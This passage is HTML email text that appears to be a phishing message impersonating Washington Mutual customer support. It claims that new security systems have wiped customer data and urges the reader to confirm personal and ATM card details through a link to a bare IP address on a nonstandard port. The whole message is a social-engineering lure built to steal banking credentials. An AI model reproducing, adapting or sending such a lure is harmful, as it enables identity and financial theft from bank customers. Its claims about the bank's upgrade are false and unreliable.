The management of our bank has made a decision to switch to new transfers security methods because of frequent fraudulent operations. The new updated technologies will ensure the security of your payments through our bank. As both software and hardware will be updated, some personal data will be lost inevitably. In order to restore all information, necessary for new convenient and safe high-quality level of service to handle your ATM card, please confirm your personal details <a href="http://210.14.252.47:880/wamu/">here</a></font></p>
<p><font face="Arial, Helvetica, sans-serif" size="2">Looking forward to your understanding,<br>
      <br>
    Washington Mutual Customer Support. </font></p>
